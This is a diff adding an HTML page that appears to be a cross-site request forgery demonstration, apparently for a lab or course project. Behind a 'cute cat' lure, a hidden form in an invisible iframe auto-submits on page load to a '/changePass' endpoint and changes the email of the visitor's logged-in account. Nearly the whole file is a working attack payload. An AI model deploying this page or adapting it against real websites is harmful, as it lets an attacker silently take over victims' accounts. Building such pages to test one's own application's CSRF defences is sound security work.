@@ -1,0 +1,20 @@
+<html>
+<!-- Changes the user account email when the user is logged into the website and visits this web page -->
+
+<body>
+    <h1>Look at this cute cat!</h1>
+    <img src="../Images/cat.jpg" alt="Cute Cat">
+    <iframe style="display:none" name="csrf-iframe"></iframe>
+    <form action="/changePass" method="POST" target="csrf-iframe" id="csrf-form">
+        <!-- To be modified after the backend is done -->
+        <input type="hidden" name="email" value="testemail@test.ca">
+    </form>
+
+    <script>
+        window.onload = function () {
+            document.getElementById("csrf-form").submit();
+        };
+    </script>
+</body>
+
+</html>
